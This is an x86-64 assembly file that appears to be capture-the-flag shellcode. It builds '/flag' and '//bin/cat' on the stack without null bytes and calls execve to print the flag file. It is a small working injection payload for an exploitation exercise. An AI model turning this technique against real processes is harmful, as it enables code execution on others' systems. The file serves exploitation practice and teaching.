.intel_syntax noprefix
.global _start
_start:
    push 0x67616c66
    push 0x2f
    mov dword ptr [rsp + 1], 0x67616c66
    push rsp
    pop rsi

    push 0x74                   
    push 0x2f
    mov dword ptr [rsp + 1], 0x6e69622f   
    mov byte  ptr [rsp + 5], 0x2f         
    mov word  ptr [rsp + 6], 0x6163       
    push rsp
    pop rdi

    push 0
    push rsi
    push rdi
    push rsp
    pop rsi
    xor edx, edx
    push 59
    pop rax
    syscall
